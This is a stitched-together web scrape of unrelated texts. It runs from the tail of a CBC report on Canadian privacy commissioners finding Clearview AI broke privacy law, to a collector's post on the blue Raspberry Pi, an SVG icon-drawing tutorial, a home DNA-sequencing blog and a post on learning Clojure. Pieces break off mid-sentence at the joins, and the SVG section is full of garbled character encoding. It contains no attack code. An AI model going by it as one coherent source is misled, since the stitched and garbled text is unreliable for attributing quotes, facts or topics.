"It is an affront to individuals' privacy rights and inflicts broad based harm on all members of society who&nbsp;find themselves continually in a police lineup."</p>  <p>"This is completely unacceptable."</p>  <p>Therrien said the company continues to claim what it was doing was&nbsp;appropriate, citing the requirement under federal privacy law that its business needs to be balanced against privacy rights."</p>  <p>British Columbia privacy commissioner Michael McEvoy said he was struck by the "vast amount" of information that was collected without consent.</p>  <p>"I find it unacceptable, to be frank, deeply troubling, that a company would create a giant database of our biometric data and sell it for profit without regard to recognizing or acknowledging how invasive it really is."</p>  <p>McEvoy said the case also highlights the need to strengthen privacy laws in Canada.</p>  <p>"In this case we are left without the ability to consider financial sanctions. This lack of enforcement power combined with Clearview's blatant disregard of privacy laws leaves Canadians vulnerable."</p>  <h2>Delete photos of Canadians in database, commissioners say</h2>  <p>The commissioners called for Clearview&nbsp;AI to stop offering its technology in Canada, stop collecting images of Canadians and to delete the photos of Canadians it had already collected in its database.</p>  <p>If the company refuses to follow the recommendations, the four privacy commissioners will "pursue other actions available under their respective acts to bring Clearview&nbsp;into compliance with Canadian laws," the statement said.</p>  <p>However, the four acknowledged that under current laws, and even under proposed changes to federal privacy laws, their ability to penalize the company or force it to comply with Canadian orders is&nbsp;limited.</p>  <p><strong><em>WATCH |&nbsp;Clearview AI violated Canadian privacy law with facial recognition: report</em></strong></p>  <p><span><span><div><div title="Clearview AI violated Canadian privacy law with facial recognition: report" role="button" tabindex="0"><div><div aria-labelledby="1853359683716-metadata-" title="Clearview AI violated Canadian privacy law with facial recognition: report"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/78/543/clearview-ai-facial-daigle-030221.jpg" alt="" loading="lazy"></p></div></div></div></div></div><span>Canadian privacy commissioners have found that American technology company Clearview AI violated Canadian law when it collected images of people without their knowledge or consent.<!-- --> <!-- -->1:55</span></span></span></p>  <p>UK Information Commissioner Elizabeth Denham's office confirmed Wednesday that their office is still investigating Clearview&nbsp;AI in conjunction with the Office of the Australian&nbsp;Information Commissioner.</p>  <div><p>Doug Mitchell, lawyer for Clearview AI, said the company simply collects public data in the same way as&nbsp;companies like Google.</p><p>  "Clearview AI's technology is not available in Canada and it does not operate in Canada. In any event, Clearview AI only collects public information from the Internet which is explicitly permitted under PIPEDA," Mitchell wrote in a statement, issued minutes after the report was made public.</p></div>  <div><p>PIPEDA, Canada's Personal Information Protection and Electronic Documents Act, governs companies.</p><p>  "The Federal Court of Appeal has previously ruled in the privacy context that publicly available information means exactly what it says: 'available or accessible by the citizenry at large.'" Mitchell wrote. "There is no reason to apply a different standard here."</p></div>  <h2>Privacy experts say technology could be misused</h2>  <p>The report by Therrien, McEvoy, Alberta privacy commissioner Jill Clayton and Diane Poitras, president of Quebec's Commission d'accès à l'information,&nbsp;comes nearly seven months after Clearview&nbsp;AI agreed to no longer make its controversial facial recognition software available in Canada. A number of Canadian law enforcement agencies, including the RCMP, Toronto and Calgary police, had been using the advanced technology to help identify perpetrators and victims of crimes.</p>  <p>With the technology, police could input the picture of a victim or suspected criminal and compare it with billions of photos it had collected from the internet and social media accounts.</p>  <p>However, privacy experts warned&nbsp;that the technology could be misused.</p>  <p>While police forces said last summer that they stopped using Clearview AI, questions remained about what would happen to the personal information of Canadians that the company had already collected and whether the company would stop collecting personal information belonging to Canadians.</p>  <h2>'Proud of our record in assisting Canadian law enforcement'</h2>  <p>In July, company CEO Hoan Ton-That said the company had ceased its operations in Canada. He said Canadians would be able to opt out of Clearview AI's search results.</p>  <p>"We are proud of our record in assisting Canadian law enforcement to solve some of the most heinous crimes, including crimes against children," Ton-That said in a statement at the time. "We will continue to co-operate with the (Office of the Privacy Commissioner) on other related issues."</p>  <p>The investigation found&nbsp;that Clearview&nbsp;AI&nbsp;collected images in Canada and actively marketed its services to Canadian police forces. The RCMP&nbsp;paid for its services, and there were 48 accounts created for law enforcement agencies and other organizations across Canada.</p>  <p>In a separate investigation, the federal privacy commissioner's office is probing&nbsp;the way the RCMP used Clearview AI's technology.</p>  <p>In a news conference, Therrien said a small number of private companies in Canada, which he did not name, had also used Clearview AI's technology, but have since stopped.</p>  <p>While the company is no longer allowing its technology to be used in Canada. Therrien said it has refused to delete the photos of Canadians in its database. While it allows individuals to apply to them to be deleted, it requires them to send a photo, he said.</p>  <p>The case raises the thorny issue of the use of facial recognition technology by police and shines a light on the lack of rules and regulations surrounding it in Canada.</p>  <p>Therrien said the privacy commissioners plan to provide guidance this spring to law enforcement agencies concerning the technology but he said Canada's laws have to be updated. While proposed updates to Canada's privacy laws currently before Parliament (Bill C-11) would give him order making powers he currently does not possess, he would like to see the law amended to make it clearer that business concerns should not outweigh privacy.</p>  <p>Therrien said the company has likely collected the images of millions of Canadians in its 3 billion image database.</p>  <p>Therrien said he would also like to see&nbsp;more types of violations subject to penalties than are currently called for in Bill C-11.</p>  <p>NDP MP Charlie Angus, who had called for an investigation into Clearview&nbsp;AI, praised the report,</p>  <p>Angus said he plans to call Therrien&nbsp;to present his findings to the House of Commons ethics committee and wants the head of the RCMP to appear before the committee as well.</p>  <p>"I will be requesting the head of the RCMP&nbsp;to testify as to why the RCMP&nbsp;used a technology that was illegal and why they misrepresented their use of this illegal technology," he said in an e-mail to CBC News.</p>  <p>However, Angus said he doesn't plan to call on Clearview AI to testify since they are not currently operating in Canada.</p>  <p>Catherine Fortin, spokeswoman for the RCMP, said the force used Clearview AI's technology in a "limited capacity" for its investigations into online sexual exploitation of children and stopped using the technology in July 2020 when the company stopped offering it in Canada.</p>  <p>"With the nature of crime constantly evolving, law enforcement agencies, including the RCMP, must continuously monitor emerging and evolving technologies," Fortin&nbsp;said in an email to CBC News. "We also recognize that privacy is paramount and a reasonable expectation of Canadians, which must be balanced with the ability of law enforcement to conduct investigations and protect the safety and security of Canadians."</p>  <p>Fortin said the RCMP&nbsp;is working with Therrien's office on its investigation into how the force used the technology and will review the report made public Wednesday.</p>  <p>Meanwhile, Conservative MP Michael Barrett said in a statement that he was "deeply concerned" by the findings of the investigation into Clearview AI and called for the House of Commons ethics committee to hold hearings into the company.</p>  <p>"Clearview AI's rejection of the Privacy Commissioner's findings and its disregard for Canadian privacy laws raises serious concerns and deserves further scrutiny by parliamentarians."</p>  <p>Elizabeth Thompson can be reached at <a href="mailto:elizabeth.thompson@cbc.ca">elizabeth.thompson@cbc.ca</a></p>  </span></p></div></div>]]>

<h2>Introduction</h2>



<div><p>Back in 2013 exactly 1 year after the first Raspberry Pi was sold RS components – One of two licenced Raspberry Pi Manufacturers at the time released a limited production run of 1000 blue Raspberry Pis. </p><p>They came with a Certificate of Authenticity signed by Eben Upton and a matching Blue case from One Nine Design in Wales.   </p></div>

<div><p>There was a pretty big catch though. They were never available to purchase. So how did you get one? </p><p>The majority of them were donated to charities involving kids educations and some were given away as competition prizes. Although it seems like a few slipped through the net!</p></div>



<div><p>I managed to get my hands on one and there are several available on eBay. I spoke to the eBay seller and he claims his Friend that used to work for RS Components gave him them. </p><p>Lets take a look at mine.</p></div>

<p>It turns out the Rev 2 Model B doesn’t only come in Blue and Green. Egoman (A Chinese electronic device manufacturer) were licenced to produce a Model B for the Chinese Market with a Red PCB to make the device easy to distinguish. The reason for this was simple, the boards are missing the FCC/CE markings making it illegal to import them into the EU or USA. It seems that very few did make it into the UK although they are around, a popular Crypto mining ASIC used the Red Pi as a controller board. If anyone has one for sale I would be very interested in purchasing one to complete my collection! </p>



<h2>Conclusion </h2>



<p>The Blue Pi is a cool device however its nothing more than a collectors item at this point. I haven’t even attempted to power this one on although I fully expect it will work!</p>



<p>More information can be found in the original press release <a href="https://www.raspberrypi.org/blog/blue-pi/">here</a>. </p>



<p>There are also a few for sale on eBay <a href="https://www.ebay.co.uk/itm/early-raspberry-Pi-Blue-Case-Collectors-Rare-Limited-Edition/333871943231?hash=item4dbc518e3f:g:qAcAAOSwtD5gExmD" target="_blank" rel="noreferrer noopener nofollow">here</a> but be quick! They end tomorrow.  </p>

    <p>For as long as I can remember, I avoided touching SVGs when working with front-end code. Iâ€™d have no trouble with HTML, CSS, or JavaScript, but SVGs always intimidated me with their bizarre syntax and those weird, indecipherable strings of letters and numbers. You know the ones:</p>

<div><div><pre><code><span>&lt;svg</span> <span>viewBox=</span><span>"0 0 24 24"</span> <span>width=</span><span>"24"</span> <span>height=</span><span>"24"</span><span>&gt;</span>
  <span>&lt;path</span> <span>d=</span><span>"M 4 4 h 16 a 2 2 0 0 1 2 2 v 14"</span> <span>/&gt;</span>
<span>&lt;/svg&gt;</span>
</code></pre></div></div>

<p>If I needed icons for a project, Iâ€™d install one of the many icon libraries that are available, but that always left me unsatisfied. Sure, thereâ€™s nothing wrong with using libraries, but itâ€™s always a good idea to know how the tools you use really work under the hood. So why not also learn how to draw your own SVG icons by hand, even if you end up using a library in the end?</p>

<p>As youâ€™ll see in this tutorial, coding SVG icons by hand is actually fairly straightforward once you master the basic shapes and syntax. Weâ€™ll draw a bunch of icons to help you hone your SVG skills. Hereâ€™s a sneak peek at all of the icons weâ€™ll create:</p>

<ul>
  <li>
    <svg viewBox="0 0 24 24" width="32" height="32">

      <line x1="12" y1="14" x2="20" y2="6"></line>
      <polyline points="16 5.5, 20 5.5, 20 9.5"></polyline>
    </svg>
  </li>
</ul>

<p>If youâ€™re curious, I took inspiration for these SVG icons from <a href="https://feathericons.com/">Feather Icons</a>, a fantastic library created by <a href="https://colebemis.com/">Cole Bemis</a>. These icons will help us learn how to draw the following shapes with SVG:</p>

<ul>
  <li>Lines</li>
  <li>Polylines</li>
  <li>Circles</li>
  <li>Polygons</li>
  <li>Curved paths</li>
</ul>

<p>Once youâ€™ve learned the basics, you can draw almost anything with SVGs.</p>

<p>I hope youâ€™re excited to get started! Feel free to jump around if you want, but Iâ€™ve structured this tutorial intentionally so that each section builds on new knowledge.</p>

<h2 id="what-is-an-svg">What Is an SVG?</h2>

<p><strong>SVG</strong> stands for <strong>Scalable Vector Graphics</strong>; itâ€™s a vector image format that allows you to draw shapes using a standard markup (XML) syntax. The â€œscalableâ€� part of the name is a key characteristic of SVGsâ€”unlike other image formats, they donâ€™t lose quality when you scale them beyond their original size. Whereas images store their data using fixed-size pixels, SVGs store them as XML definitions for shapes, which can easily be scaled responsively to any size.</p>

<p>Itâ€™s also worth noting that you can animate SVGs; <a href="https://www.joshwcomeau.com/react/boop/">Joshua Comeau</a> uses this to great effect on his site, creating a delightful and interactive user experience.</p>

<h3 id="how-are-svgs-drawn">How Are SVGs Drawn?</h3>

<p>There are two ways to draw SVGs: by hand, where you define the markup explicitly using HTML, or through a <strong>vector image program</strong> like <a href="https://inkscape.org/">Inkscape</a>:</p>

<p><a href="https://www.aleksandrhovhannisyan.com/assets/images/posts/svg-tutorial-how-to-code-svg-icons-by-hand/inkscape.png"><picture>
    <source srcset="https://www.aleksandrhovhannisyan.com/assets/images/posts/svg-tutorial-how-to-code-svg-icons-by-hand/inkscape-placeholder.webp" type="image/webp" data-srcset="/assets/images/posts/svg-tutorial-how-to-code-svg-icons-by-hand/inkscape.webp">
    <img src="https://www.aleksandrhovhannisyan.com/assets/images/posts/svg-tutorial-how-to-code-svg-icons-by-hand/inkscape.png" alt="Inkscape's user interface consists of drawing tools on the left-hand side, page alignment and setup options on the right, and a canvas in the center." data-src="/assets/images/posts/svg-tutorial-how-to-code-svg-icons-by-hand/inkscape.png">
  </picture></a></p>

<p>These programs come with basic shapes, color pickers, drawing tools, and path manipulation, allowing you to create complex drawings with greater ease than if you were to do them by hand. Youâ€™ll typically see designers and logo artists using GUIs like Inkscape rather than coding SVGs by hand. Still, understanding how SVG markup works is a valuable learning experience. At the end of the day, these programs output <code>.svg</code> files; if you inspect those files, youâ€™ll find that their markup is just XML, and you can make sense of it if you understand how SVGs work.</p>

<h2 id="svg-101-how-to-code-svgs-by-hand">SVG 101: How to Code SVGs by Hand</h2>

<p>I know youâ€™re itching to get to the examples, but first things first!</p>

<p>All SVG shapes are defined within the SVG element itself, like this:</p>

<div><div><pre><code><span>&lt;svg&gt;</span>
  <span>&lt;!-- stuff goes here --&gt;</span>
<span>&lt;/svg&gt;</span>
</code></pre></div></div>

<p>Of course, thereâ€™s more to it than just that. Letâ€™s explore the basic anatomy of an SVG.</p>

<h3 id="svg-namespace-declarations">SVG Namespace Declarations</h3>

<p>If youâ€™ve ever inspected the contents of an <code>.svg</code> file, like one created by Inkscape or some other vector image program, you may have seen this <code>xmlns</code> attribute on the <code>svg</code> element itself:</p>

<div><div><pre><code><span>&lt;svg</span> <span>xmlns=</span><span>"http://www.w3.org/2000/svg"</span><span>&gt;&lt;/svg&gt;</span>
</code></pre></div></div>

<p>This is known as a <a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Namespaces_Crash_Course#declaring_namespaces">namespace declaration</a>. In simple terms, a namespace declaration helps a user agent like your browser to understand and parse an elementâ€™s syntax. Here, weâ€™ve declared that our namespace is SVG. A namespace declaration is <a href="https://stackoverflow.com/a/18468348/5323344">not required if youâ€™re rendering inline SVG icons</a>, like in HTML. But if youâ€™re including SVG <em>files</em> (e.g., as an image), then the SVG does need to specify its namespace. Iâ€™ll omit the namespace in this tutorial since we donâ€™t need one.</p>

<h3 id="svg-viewbox-and-size">SVG <code>viewBox</code> and Size</h3>

<p>Youâ€™ve probably also seen these three attributes: <code>width</code>, <code>height</code>, and <code>viewBox</code>:</p>

<div><div><pre><code><span>&lt;svg</span>
  <span>viewBox=</span><span>"0 0 24 24"</span>
  <span>width=</span><span>"24"</span>
  <span>height=</span><span>"24"</span>
<span>&gt;&lt;/svg&gt;</span>
</code></pre></div></div>

<p>Basically, the <code>viewBox</code> attribute defines <strong>the dimensions of the viewport (â€œcanvasâ€�) for our SVG</strong>. The first two numbers allow us to pan the SVG viewport horizontally or vertically, giving it an appearance of some sort of inner offset relative to the origin, <code>(0, 0)</code>. Here, we have an offset of <code>0 0</code>, meaning the top-left corner of the viewport <em>is</em> the origin, <code>(0, 0)</code>. The last two numbers control the base size of the viewport, before the SVG is scaled. Larger numbers lead to a larger viewport and more space to work with, while smaller numbers lead to a smaller viewport and less space to work with. Here, the viewport size is declared to be <code>24x24</code>, so our coordinates range from <code>(0, 0)</code> (top-left) to <code>(24, 24)</code> (bottom-right):</p>

<p><a href="https://www.aleksandrhovhannisyan.com/assets/images/posts/svg-tutorial-how-to-code-svg-icons-by-hand/coordinates.png"><picture>
    <source srcset="https://www.aleksandrhovhannisyan.com/assets/images/posts/svg-tutorial-how-to-code-svg-icons-by-hand/coordinates-placeholder.webp" type="image/webp" data-srcset="/assets/images/posts/svg-tutorial-how-to-code-svg-icons-by-hand/coordinates.webp">
    <img src="https://www.aleksandrhovhannisyan.com/assets/images/posts/svg-tutorial-how-to-code-svg-icons-by-hand/coordinates.png" alt="An SVG's coordinate system has an origin of (0, 0) at the top-left corner. For an SVG whose viewBox is 0 0 24 24, the bottom-right corner is at (24, 24)." data-src="/assets/images/posts/svg-tutorial-how-to-code-svg-icons-by-hand/coordinates.png">
  </picture></a></p>

<p>The other two attributes, <code>width</code> and <code>height</code>, work just as youâ€™d expect: They define the width and height of your SVG element, in pixels. You can also change an SVGâ€™s size with CSS using <code>width</code> and <code>height</code>, so while the SVG above has a starting width and height of <code>24px</code>, it doesnâ€™t <em>always</em> have to be that size. Thatâ€™s the whole point of SVG, after allâ€”they can scale to <em>any</em> size!</p>

<p>Moreover, note that the the width and height of an SVG donâ€™t need to match the <code>viewBox</code>â€™s size. In fact, the coordinates of all SVG shapes that we draw are relative to the <code>viewBox</code>, not to the <code>width</code> and <code>height</code> of the SVG.</p>

<p>For example, if our <code>viewBox</code> is <code>0 0 24 24</code> but weâ€™ve set the width and height to be <code>32</code>, or some other number, then weâ€™re still working within a base viewport size of <code>24x24</code>, so thereâ€™s no visible point like <code>(25, 25)</code>. Everything will just get scaled up by a factor of <code>1.3</code> to give us a bigger SVG drawing. This is really useful because it means we can draw all of our icons using a fixed viewport size, and if we later want to scale it up, we donâ€™t have to adjust the shapes and their coordinatesâ€”the <code>width</code> and <code>height</code> will scale everything for us.</p>

<p>For this tutorial, Iâ€™ll use a <code>viewBox</code> of <code>0 0 24 24</code>, but dimensions of <code>64x64</code> so theyâ€™re easier to see. You can use any values that you want, though, so long as you adjust your markup accordingly.</p>

<h3 id="svgs-and-pixels">SVGs and â€œPixelsâ€�</h3>

<p>Before we move on, a clarifying note on pixels and SVGs: With the most basic SVG, one pixel unit maps to exactly one unit on your screen. But as noted on the MDN docs, <a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Tutorial/Positions#what_are_pixels">this isnâ€™t always the case</a>. SVGs are scalable, after all, so <code>1px</code> in the SVG definition may actually map to <code>4px</code> if the SVG has been scaled to a larger size with <code>width</code> and <code>height</code>. This is unlike the behavior of images, where one â€œpixelâ€� is always a fixed-size unit of measurement. Key takeaway: Wherever I use <code>px</code> as a unit, donâ€™t take that to mean one literal output pixel on the userâ€™s screen.</p>

<h2 id="creating-basic-shapes-with-svg">Creating Basic Shapes with SVG</h2>

<p>The best way to learn how to draw SVG icons by hand is to work with basic shapes. To get started, weâ€™ll draw some icons using lines. This will get us familiar with some of the basics of SVG before we dive into more advanced shapes.</p>

<h3 id="1-lines">1. Lines</h3>

<p>Weâ€™ll practice our line-drawing skills by recreating the three icons below. Youâ€™ll find these in lots of text editors that offer text alignment options, so while this exercise may seem trivial, itâ€™s actually very practical:</p>

<ul>
  <li>
    <svg viewBox="0 0 24 24" width="64" height="64">
      <line x1="2" y1="4.2" x2="22" y2="4.2"></line>
      <line x1="2" y1="9.4" x2="16" y2="9.4"></line>
      <line x1="2" y1="14.6" x2="22" y2="14.6"></line>
      <line x1="2" y1="19.8" x2="16" y2="19.8"></line>
    </svg>
  </li>
  <li>
    <svg viewBox="0 0 24 24" width="64" height="64">
      <line x1="2" y1="4.2" x2="22" y2="4.2"></line>
      <line x1="6" y1="9.4" x2="18" y2="9.4"></line>
      <line x1="2" y1="14.6" x2="22" y2="14.6"></line>
      <line x1="6" y1="19.8" x2="18" y2="19.8"></line>
    </svg>
  </li>
  <li>
    <svg viewBox="0 0 24 24" width="64" height="64">
      <line x1="2" y1="4.2" x2="22" y2="4.2"></line>
      <line x1="8" y1="9.4" x2="22" y2="9.4"></line>
      <line x1="2" y1="14.6" x2="22" y2="14.6"></line>
      <line x1="8" y1="19.8" x2="22" y2="19.8"></line>
    </svg>
  </li>
</ul>

<p>As you can see, these all consist of just four horizontal lines.</p>

<p>To draw a line in SVG, we need two things:</p>

<ul>
  <li>A starting point: <code>(x1, y1)</code>.</li>
  <li>An ending point: <code>(x2, y2)</code>.</li>
</ul>

<p>As a reminder, an SVGâ€™s coordinate system starts with <code>(0, 0)</code> at the top-left corner. The <code>x</code>-values increase as you move to the right, and the <code>y</code>-values increase as you move down.</p>

<p>SVGs allow us to specify the starting and ending points for lines using four attributes: <code>x1</code>, <code>y1</code>, <code>x2</code>, and <code>y2</code>. So, to draw a simple horizontal line, we could do the following:</p>


<div><div><pre><code><span>&lt;svg</span> <span>viewBox=</span><span>"0 0 24 24"</span> <span>width=</span><span>"64"</span> <span>height=</span><span>"64"</span><span>&gt;</span>
  <span>&lt;line</span> <span>x1=</span><span>"0"</span> <span>y1=</span><span>"4.2"</span> <span>x2=</span><span>"24"</span> <span>y2=</span><span>"4.2"</span><span>/&gt;</span>
<span>&lt;/svg&gt;</span>
</code></pre></div></div>

<p>You can think of this as telling the browser to put an imaginary pen down at <code>(0px, 4.2px)</code> and move it right until it reaches <code>(24px, 4.2px)</code>.</p>

<p>If you use this markup on your end, you wonâ€™t see anything just yet. Thatâ€™s because we havenâ€™t told the browser what color to use for the line! There are two ways we can do this:</p>

<ul>
  <li>Setting the <code>stroke</code> attribute on the SVG element or any of its individual shapes.</li>
  <li>Setting the <code>stroke</code> property via CSS, on the SVG element or any of its shapes.</li>
</ul>

<p>Both will do the same thing, but I prefer the CSS approach since it means writing less code. You can either pass in a hard-coded color, like a hex value, or use the magic <code>currentColor</code> value:</p>

<div><div><pre><code><span>svg</span> <span>{</span>
  <span>stroke</span><span>:</span> <span>currentColor</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>In CSS, <code>currentColor</code> always references the current text <code>color</code>, which is either the color inherited from the parent or whatever color youâ€™ve explicitly defined for that element. I prefer <code>currentColor</code> for SVGs, as it makes it easy for me to insert my icons anywhere I want, and theyâ€™ll inherit the surrounding text color. Moreover, if that text color is set using CSS custom properties, <code>currentColor</code> will change whenever the custom property changes! This is useful for styling SVG icons in apps that have both a light and a dark mode (like this …</p></div></article></div></div>

The sensor is in the small window near the “SpotON” port.  <a href="https://www.youtube.com/watch?time_continue=15&amp;v=hs0FdiTHMbc">Video explanation</a> of the principal of operation.</p></div>
<p>About a year ago, my girlfriend says, “I think we can sequence DNA in our extra room.” She showed me the website of Oxford Nanopore, which makes a USB DNA sequencer. We joked about it for a bit and that was that.</p>
<p>Until October, when I decided to buy her one for Christmas. I punched my credit card into their nice online store and waited for my shipping confirmation, which never arrived. Finally, I emailed them and found out I needed to join their “community.” At this point, I should mention that I’m not a biologist and I’m certainly not qualified to join a community of researchers. And they wanted to have a phone call. And this thing had better arrive by Dec. 25.</p>
<p>So I fessed up to my girlfriend (who has a PhD in genetics) and she wrote me a notecard with exactly what to say. I studied up. The day comes and I’m all nervous. The rep, I’ll call her Alice, phones and I proudly explain all the things I’m going to do, straight off my notecard.</p>
<p>Then Alice starts asking questions. I was not prepared for questions. Do I have a temperature controlled fridge? Duh, of course (in the kitchen)<span id="easy-footnote-1-233"></span><span><a href="#easy-footnote-bottom-1-233" title="it wasn&amp;#8217;t and we soon acquired a new fridge"><sup>1</sup></a></span> A freezer? Yes obviously<span id="easy-footnote-2-233"></span><span><a href="#easy-footnote-bottom-2-233" title="yeah we bought a new one of those too"><sup>2</sup></a></span>. A centrifuge and thermocycler? “Uh sure yeah I have that<span id="easy-footnote-3-233"></span><span><a href="#easy-footnote-bottom-3-233" title="hope that thing I just claimed to own isn&amp;#8217;t too expensive"><sup>3</sup></a></span>.” Then Alice started asking questions about my research. Uh oh. I repeat something about bacterial colonies from my card but she isn’t buying it. I manage to get out that I understand this isn’t a spit-in-the-tube-and-done thing and that’s all I’ve got. She keeps pushing and I eventually admit that I’m really buying it for my girlfriend for Christmas. Apparently that’s okay, since once Alice finishes laughing she said that it will arrive by Dec. 25 but they don’t offer a gift-wrap service.</p>
<p>The box arrives, packed in some sweet dry ice stuff. Dec. 25 comes and I get a set of pipettes and a PCR machine.</p>
<p>The obvious thing to sequence is one of us but the MinION can only do 1-2 billion bases per run<span id="easy-footnote-4-233"></span><span><a href="#easy-footnote-bottom-4-233" title="in our hands; Oxford Nanopore <a href=&quot;https://nanoporetech.com/products/minion&quot;>claims 10-20 Gb now</a>"><sup>4</sup></a></span>; to have decent quality for a human you need more like 90 billion <span id="easy-footnote-5-233"></span><span><a href="#easy-footnote-bottom-5-233" title="there&amp;#8217;s a lot of variables here, go read this: <a href=&quot;https://www.nature.com/articles/nbt.4060&quot;>Nanopore sequencing and assembly of a human genome with ultra-long reads</a>"><sup>5</sup></a></span>. We decide to swab our mouths before brushing our teeth and find out what’s in there. My girlfriend whips up some media, we plop our swabs in, and put the tubes in the $30 chicken egg incubator she found on Amazon. Two days later I’m informed that the cultures smell like “really really bad breath,” and that I “really ought to smell them for myself,” which I studiously avoid for the next two months.</p>
<p>With the help of a <a href="https://greenbioresearch.com/product/genomic-dna-isolation-extraction-purification-kit-for-blood-bacteria-cell-tissue-samples/">$80 genomic DNA extraction kit</a>, we cut up the cells, filter all their bits out, and have genomic DNA ready to go. First we run a gel electrophoresis to prove to ourselves that we didn’t mess up the extraction too much.</p>
<p>At this step, all the real biologists out there are assuming I’m going to talk about quantifying the DNA to make sure we had the right concentration before blowing a $500 flow-cell (the consumable part of the MinION) on this. Yeah, that would be a lot of work and the line is pretty bright in the gel…</p>
<p>We open the fridge to get out the sequencer’s flow-cell and notice that everything is frozen. Oh %$@*#@#*. I set the fridge to “10” because that seemed like a good idea. Alice definitely isn’t going to buy my warranty-return story. Two days later we’ve got a new thermometer and are praying that 100 freeze-thaw cycles are, uh, totally fine.</p>
<p>Happily the MinION comes with a calibration program that doesn’t seem to notice our substandard storage: all green. At this point we discover that Oxford Nanopore helpfully sends everyone a set of sample DNA to run first. We decide that sounds like a really good idea.</p>
<p>The promotional videos for the MinION claim, “simple 10 minute setup.” About two hours later, we’ve done the library prep, and we’re pipetting into the device. There are lots of warnings on their webpage about how you really can’t let air into the thing (permanent destruction of the flow-cell, blah blah). So of course the first thing we do is introduce an air bubble. But it only covers half the sensor. I think it’s the most expensive 5µL of air I’ve ever seen.</p>
<p>It turns out the sequencer produces so much data the minimum requirements are a 1TB SSD and a quad-core CPU. My girlfriend’s laptop has 200 GB and a dual core, so that will have to suffice. We fire it up and it starts producing reads. We’re over the moon. 6-hours later the run finishes, but only 10% of the bases have been “called.” The way the system works is by reading tiny changes in electric current as the molecules pass through the nanopore. Apparently the signal processing is kind of hard because 2 days later it’s still going. I play Overwatch by myself.</p>
<p><video autoplay="autoplay" loop="loop" width="99%" height="150"><source src="https://i.imgur.com/Mlg4V3f.mp4"></video><br>
<em>Sequencing. You can see the 512 ports on the laptop screen. Approximately half are green (sequencing or waiting for DNA) and the other half are blue (air-bubbled).</em></p>
<p>The Oxford Nanopore website supports automated uploading and analysis of some datasets, including the calibration run. <a href="http://www.abarry.org/likelytobeforgotten/wp-content/uploads/2018/04/Selection_120.png">Our run</a> produced 983 million (aligned) base pairs, which any professionals reading this are scoffing at, but I’m pretty sure Celera circa 2000 would have been impressed. I certainly am. The last time I did anything close to this, we tested PTC tasting with a gel electrophoresis that took all day and effectively sequenced 1 base. We prep and load our mouth-bacteria genomic DNA into the sequencer. We’re reusing the flow-cell to save money and it’s hard to load correctly. We’re all paranoid about air bubbles now, but there’s a ton of them in the little fluid pipes. Eventually we look at each other, shrug, and put the sample in. It goes nowhere.</p>
<p>The library prep includes adding “loading beads” to the sample which give the liquid a ghostly white color. You can see if your sample is on the sensor by tracking the movement of that color, and ours clearly was stuck on the top of the port. Eventually we searched the forums and found someone else incompetent enough to have the same problem, with a solution that can be summarized as, “pull some liquid out of a different port and hope.” It worked great.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>For a few last years I’ve been learning programming in various languages, on and off, with more or less success. Some languages that I’ve tried include Python, Java, Haskell and even JavaScript. And of course Clojure. But it has been going slowly, not because those languages (or programming in general) are hard. It’s because I lacked consistency in doing things on regular basis due to lack of time and energy; I’ve often been mentally exhausted at my regular IT work. Here’s how I finally managed to organize myself and actually started getting it!</p><h3 id="ancient-history">Ancient history</h3><p>I’ve been interested in computers for most of my life. It can be shortly described as ‘power user’ e.g. <em>system configuration, setup, various audio/video editing tools…</em>, but I’ve never really took up programming until 2017. (You can read about my contemporary views <a href="https://savo.rocks/posts/an-unexpected-toolbox-for-a-beginner-programmer/" target="_blank">here</a>). Back then I managed to learn some Python syntax, but it all came down to following the materials I have been learning from, and I gave up after some time. In the meantime I have been dabbling with various languages and technologies, but never crossed the chasm to serious work beyond tutorials and books.</p><h3 id="recent-development">Recent development</h3><p>When I wasn’t trying to learn programming I was playing guitar with various bands I had and worked in several companies on various positions in IT departments. Those positions included various tasks such as system administration &amp; maintenance, vendor coordination and even IT support call-center coordination. During that time I still managed to dabble with programming irregularly, mostly with Clojure because I liked how it doesn’t get in my way. It can be set up almost instantly and the syntax is very minimal, which lets me concentrate on shaping my ideas into code. But very often the workload was big enough to keep me from programming constantly, so I didn’t get very far. However, recently I decided to concentrate on programming, as I realized that it brings me much joy, even when I am completely lost in the process, because when I overcome obstacles it feels phenomenal.</p><h3 id="current-situation">Current situation</h3><p>I discovered a one-step-beyond-basics book that suits my needs perfectly: <a href="https://pragprog.com/titles/dswdcloj3" target="_blank">Web Development with Clojure</a> and bought a copy. I’m getting serious now :) Currently, the book is in beta, but it is expected to be finished very soon. This book shows in detail how to build modern web applications using various Clojure libraries. Clojure is different from other languages in that matter: it doesn’t have a <em>web-app framework</em>. Instead, the programmers combines various libraries which suit their particular needs.</p><h3 id="the-approach">The approach</h3><p>So, how is this time different than any other when I tried to learn programming? Read on.<br></p><ul><li>Walk the unwalked path: This time, instead of just following the book, I decided to explore the documentation of libraries that were introduced, and to try to experiment with them myself. There are often multiple libraries that serve the same purpose, and the author is kind enough to mention them in his book. One such example is two libraries for HTML templating: <a href="https://github.com/yogthos/Selmer" target="_blank">Selmer</a> which uses Django-like syntax, and <a href="https://github.com/weavejester/hiccup" target="_blank">Hiccup</a> which converts Clojure vectors to html, so <code>[:h1 "Hello There"]</code> becomes <code>&lt;h1&gt;Hello There&lt;/h1&gt;</code>. Hiccup-way seemed more attractive to me, so I decided to write the whole template in in, and I have learned more doing that, than I have ever learned following book-code. I was forced to try various approaches out, read the documentation, ask around online for solutions and in the end I felt I understand what I wrote much better.</li><li>Do things regularly: There is a wise saying which goes something like: <em>it is better to perform average every day, than to be excellent once in a while</em>. OK, it probably sounds better than I wrote it, but the point is there. I try to follow it, and to program every day for 6-8 hours. I realized that sometimes can be difficult to even start, so I start my programming day by doing <u>one</u> <a href="https://www.4clojure.com/" target="_blank">4clojure</a> exercise per day. This helps me to get <em>warmed-up</em> as I can start solving the problem immediately, because the tasks usually require just using the right Clojure function (or combination of functions), so I make sure to search this awesome <a href="https://jafingerhut.github.io/cheatsheet/clojuredocs/cheatsheet-tiptip-cdocs-summary.html" target="_blank">Clojure Cheatsheet</a> for the functions that I’ll use, and usually manage to find them. After that I just open my project, the book and code away!</li><li>Revisit previous chapters: I like to come back a little after some time to re-read previous materials to see if I’ll have new insight and maybe notice something that I missed the first time when I read the chapter. Usually there are <em>a-ha</em> moments, and makes this part very valuable in the 